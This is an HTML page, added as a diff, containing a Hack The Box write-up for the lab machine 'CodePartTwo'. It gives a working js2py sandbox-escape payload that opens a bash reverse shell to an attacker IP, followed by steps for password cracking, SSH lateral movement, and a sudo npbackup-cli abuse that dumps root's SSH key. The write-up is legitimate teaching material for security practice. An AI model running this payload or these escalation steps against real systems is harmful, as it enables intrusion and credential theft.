@@ -1,0 +1,207 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>CodePartTwo - HTB | Writeup</title>
+  <meta name="description" content="CodePartTwo HTB writeup covering js2py sandbox escape and npbackup-cli escalation.">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap"
+    rel="stylesheet">
+
+  <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../assets/css/main.css" rel="stylesheet">
+</head>
+
+<body>
+  <main class="main">
+    <section class="section">
+      <div class="container writeup-detail">
+        <div class="detail-box">
+          <div class="writeup-detail-header">
+            <a class="back-link top" href="../index.html#writeups" aria-label="Back to Writeups"><i class="bi bi-arrow-left"></i></a>
+          </div>
+          <h1>CodePartTwo - HTB</h1>
+
+          <div class="tag-list">
+            <span class="tag">Red Team</span>
+            <span class="tag">Web Exploitation</span>
+            <span class="tag">RCE</span>
+            <span class="tag">Easy</span>
+            <span class="tag">Sandbox Escape</span>
+            <span class="tag">Reverse Shell</span>
+            <span class="tag">SQLite</span>
+            <span class="tag">Password Cracking</span>
+            <span class="tag">Lateral Movement</span>
+            <span class="tag">Privilege Escalation</span>
+            <span class="tag">Sudo Abuse</span>
+            <span class="tag">Linux</span>
+          </div>
+
+          <h2>Overview</h2>
+          <p>
+            CodePartTwo is an easy Linux machine that starts with a vulnerable web application and ends with a
+            straightforward but very instructive privilege escalation path. The initial foothold comes from a
+            <code>js2py</code> sandbox escape that allows server-side command execution from a JavaScript editor
+            exposed in the application. After gaining a shell as the <code>app</code> user, a local SQLite database
+            reveals password hashes that can be cracked to obtain SSH access as <code>marco</code>. Finally,
+            privilege escalation to <code>root</code> is achieved by abusing <code>npbackup-cli</code>, a backup
+            utility that can be executed with <code>sudo</code> without a password and whose configuration file is
+            user-controlled.
+          </p>
+
+          <h2>Recon</h2>
+          <p>Initial full port scan:</p>
+          <pre><code class="language-bash">nmap -sC -sV -p- 10.10.11.82</code></pre>
+          <p>Services found:</p>
+          <ul>
+            <li>22/tcp — SSH</li>
+            <li>8000/tcp — HTTP</li>
+          </ul>
+
+          <h2>Web Enumeration</h2>
+          <p>The web app allowed downloading the source code. I pulled it locally:</p>
+          <pre><code class="language-bash">wget http://10.10.11.82:8000/static/app.zip
+unzip app.zip -d app_src
+cd app_src</code></pre>
+
+          <p>Dependencies:</p>
+          <pre><code class="language-bash">cat requirements.txt</code></pre>
+          <p>The key dependency:</p>
+          <pre><code class="language-bash">js2py==0.74</code></pre>
+
+          <p>Search for usage:</p>
+          <pre><code class="language-bash">grep -R "js2py" -n .
+grep -R "eval_js" -n .</code></pre>
+
+          <h2>Identifying the Vulnerability</h2>
+          <p>
+            The backend executes user-controlled JavaScript via <code>js2py.eval_js(...)</code>.
+            With a vulnerable version and direct execution, the sandbox escape was the entry point.
+          </p>
+
+          <h2>Initial Foothold</h2>
+          <p>Prepare a listener:</p>
+          <pre><code class="language-bash">nc -lvnp 9001</code></pre>
+
+          <p>Exploit payload (js2py sandbox escape):</p>
+          <pre><code class="language-javascript">// [+] command goes here:
+let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.153/9001 0>&1'"
+let hacked, bymarve, n11
+let getattr, obj
+
+hacked = Object.getOwnPropertyNames({})
+bymarve = hacked.__getattribute__
+n11 = bymarve("__getattribute__")
+obj = n11("__class__").__base__
+getattr = obj.__getattribute__
+
+function findpopen(o) {
+    let result;
+    for(let i in o.__subclasses__()) {
+        let item = o.__subclasses__()[i]
+        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
+            return item
+        }
+        if(item.__name__ != "type" && (result = findpopen(item))) {
+            return result
+        }
+    }
+}
+
+n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
+console.log(n11)
+n11</code></pre>
+
+          <h2>Post-Exploitation as app</h2>
+          <p>Stabilize shell:</p>
+          <pre><code class="language-bash">script /dev/null -c /bin/bash
+export TERM=xterm</code></pre>
+
+          <p>Enumerate files:</p>
+          <pre><code class="language-bash">cd /home/app/app
+find . -maxdepth 3 -type f</code></pre>
+
+          <p>SQLite database:</p>
+          <pre><code class="language-bash">sqlite3 /home/app/app/instance/users.db
+.tables
+SELECT * FROM user;
+.quit</code></pre>
+
+          <h2>Lateral Movement</h2>
+          <p>Crack marco’s hash:</p>
+          <pre><code class="language-bash">john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john hashes.txt --show</code></pre>
+
+          <p>SSH as marco:</p>
+          <pre><code class="language-bash">ssh marco@10.10.11.82</code></pre>
+
+          <h2>Privilege Escalation</h2>
+          <p>Check sudo:</p>
+          <pre><code class="language-bash">sudo -l</code></pre>
+
+          <p>Backup tool available:</p>
+          <pre><code class="language-bash">(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli</code></pre>
+
+          <p>Inspect config:</p>
+          <pre><code class="language-bash">cat npbackup.conf</code></pre>
+
+          <p>Copy and modify:</p>
+          <pre><code class="language-bash">cp npbackup.conf npbackup1.conf
+nano npbackup1.conf</code></pre>
+
+          <p>Set backup path:</p>
+          <pre><code class="language-bash">paths:
+- /root</code></pre>
+
+          <p>Run backup and list:</p>
+          <pre><code class="language-bash">sudo /usr/local/bin/npbackup-cli -c npbackup1.conf -b -f
+sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --ls</code></pre>
+
+          <p>Dump root key:</p>
+          <pre><code class="language-bash">sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --dump /root/.ssh/id_rsa</code></pre>
+
+          <p>SSH as root:</p>
+          <pre><code class="language-bash">chmod 600 id_rsa
+ssh -i id_rsa root@10.10.11.82</code></pre>
+
+          <h2>Lessons Learned</h2>
+          <ul>
+            <li>Source code downloads can reveal vulnerable dependencies and sinks quickly.</li>
+            <li>Turning RCE into a stable shell is a separate step that matters in practice.</li>
+            <li>Local databases often contain the exact creds needed for lateral movement.</li>
+            <li>Misconfigured admin tooling can be a clean privilege escalation vector.</li>
+          </ul>
+
+          <h2>Attack Chain Summary</h2>
+          <ol>
+            <li>Enumerate the web application</li>
+            <li>Download and inspect the source code</li>
+            <li>Identify js2py sandbox escape via eval_js</li>
+            <li>Gain shell as app</li>
+            <li>Extract and crack credentials from SQLite</li>
+            <li>SSH as marco</li>
+            <li>Abuse npbackup-cli to access root key</li>
+            <li>SSH as root</li>
+          </ol>
+
+          <a class="back-link bottom" href="../index.html#writeups">Back to Writeups</a>
+        </div>
+      </div>
+    </section>
+  </main>
+  <script src="../assets/js/main.js" defer></script>
+</body>
+
+</html>
+
+
+
+
+
+
